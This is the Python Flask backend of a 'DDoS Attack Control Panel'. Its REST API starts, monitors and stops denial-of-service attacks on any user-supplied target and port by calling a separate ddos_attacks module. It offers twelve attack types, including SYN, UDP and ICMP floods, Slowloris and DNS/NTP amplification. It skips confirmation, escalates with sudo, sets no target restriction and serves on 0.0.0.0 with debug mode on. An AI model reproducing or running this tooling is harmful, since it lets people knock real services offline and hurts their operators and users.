"""
DDoS Attack Control Panel - Flask Backend
Provides REST API to control ddos_attacks framework
"""

from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import subprocess
import threading
import time
import os
import sys

# Add ddos_attacks to path
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

app = Flask(__name__, static_folder='.')
CORS(app)

# Global state
attack_state = {
    'status': 'idle',  # idle, running, completed
    'attack_type': None,
    'target': None,
    'port': None,
    'duration': 0,
    'start_time': None,
    'requests_sent': 0,
    'rate': 0,
    'process': None,
    'thread': None
}

@app.route('/')
def index():
    """Serve the HTML UI"""
    return send_from_directory('.', 'index.html')

@app.route('/api/attack/start', methods=['POST'])
def start_attack():
    """Start a DDoS attack"""
    global attack_state
    
    if attack_state['status'] == 'running':
        return jsonify({'success': False, 'error': 'Attack already running'}), 400
    
    data = request.json
    attack_type = data.get('attack_type')
    target = data.get('target')
    port = data.get('port', 80)
    duration = data.get('duration', 60)
    threads = data.get('threads', 100)
    
    if not attack_type or not target:
        return jsonify({'success': False, 'error': 'Missing required parameters'}), 400
    
    # Build command
    cmd = [
        'python3', '-m', 'ddos_attacks',
        '-t', target,
        '-p', str(port),
        '-a', attack_type,
        '-d', str(duration),
        '--threads', str(threads),
        '--yes',  # Skip confirmation
        '--no-stats'  # Don't print stats (we'll parse logs)
    ]
    
    # Check if sudo is needed
    sudo_attacks = ['syn', 'udp', 'icmp', 'distributed-syn', 'distributed-udp']
    if attack_type in sudo_attacks:
        cmd.insert(0, 'sudo')
    
    # Update state
    attack_state.update({
        'status': 'running',
        'attack_type': attack_type,
        'target': target,
        'port': port,
        'duration': duration,
        'start_time': time.time(),
        'requests_sent': 0,
        'rate': 0
    })
    
    # Run attack in background thread
    def run_attack():
        try:
            # Change to scripts directory
            cwd = os.path.dirname(os.path.dirname(__file__))
            
            process = subprocess.Popen(
                cmd,
                cwd=cwd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            attack_state['process'] = process
            
            # Wait for completion
            stdout, stderr = process.communicate()
            
            # Parse output for statistics
            if 'Requests sent:' in stdout:
                for line in stdout.split('\n'):
                    if 'Requests sent:' in line:
                        try:
                            requests = int(line.split(':')[1].strip().replace(',', ''))
                            attack_state['requests_sent'] = requests
                        except:
                            pass
            
            # Mark as completed
            attack_state['status'] = 'completed'
            
        except Exception as e:
            print(f"Attack error: {e}")
            attack_state['status'] = 'error'
    
    thread = threading.Thread(target=run_attack, daemon=True)
    thread.start()
    attack_state['thread'] = thread
    
    return jsonify({
        'success': True,
        'message': f'Attack {attack_type} started on {target}:{port}'
    })

@app.route('/api/attack/stop', methods=['POST'])
def stop_attack():
    """Stop the running attack"""
    global attack_state
    
    if attack_state['status'] != 'running':
        return jsonify({'success': False, 'error': 'No attack running'}), 400
    
    # Terminate process
    if attack_state['process']:
        try:
            attack_state['process'].terminate()
            attack_state['process'].wait(timeout=5)
        except:
            attack_state['process'].kill()
    
    attack_state['status'] = 'idle'
    
    return jsonify({'success': True, 'message': 'Attack stopped'})

@app.route('/api/attack/status', methods=['GET'])
def get_status():
    """Get current attack status"""
    global attack_state
    
    # Calculate rate
    if attack_state['status'] == 'running' and attack_state['start_time']:
        elapsed = time.time() - attack_state['start_time']
        if elapsed > 0:
            attack_state['rate'] = attack_state['requests_sent'] / elapsed
    
    return jsonify({
        'status': attack_state['status'],
        'attack_type': attack_state['attack_type'],
        'target': attack_state['target'],
        'port': attack_state['port'],
        'duration': attack_state['duration'],
        'requests_sent': attack_state['requests_sent'],
        'rate': attack_state['rate'],
        'elapsed': time.time() - attack_state['start_time'] if attack_state['start_time'] else 0
    })

@app.route('/api/attacks/list', methods=['GET'])
def list_attacks():
    """List available attack types"""
    attacks = [
        {'id': 'http', 'name': 'HTTP Flood', 'sudo': False},
        {'id': 'slowloris', 'name': 'Slowloris', 'sudo': False},
        {'id': 'slow-post', 'name': 'Slow POST', 'sudo': False},
        {'id': 'slow-read', 'name': 'Slow Read', 'sudo': False},
        {'id': 'syn', 'name': 'SYN Flood', 'sudo': True},
        {'id': 'udp', 'name': 'UDP Flood', 'sudo': True},
        {'id': 'icmp', 'name': 'ICMP Flood', 'sudo': True},
        {'id': 'distributed-http', 'name': 'Distributed HTTP', 'sudo': False},
        {'id': 'distributed-syn', 'name': 'Distributed SYN', 'sudo': True},
        {'id': 'distributed-udp', 'name': 'Distributed UDP', 'sudo': True},
        {'id': 'dns-amp', 'name': 'DNS Amplification', 'sudo': False},
        {'id': 'ntp-amp', 'name': 'NTP Amplification', 'sudo': False},
    ]
    return jsonify(attacks)

if __name__ == '__main__':
    print("=" * 60)
    print("DDoS Attack Control Panel - Backend Server")
    print("=" * 60)
    print("Starting Flask server on http://0.0.0.0:5001")
    print("Open http://localhost:5001 in your browser")
    print("=" * 60)
    
    app.run(host='0.0.0.0', port=5001, debug=True)
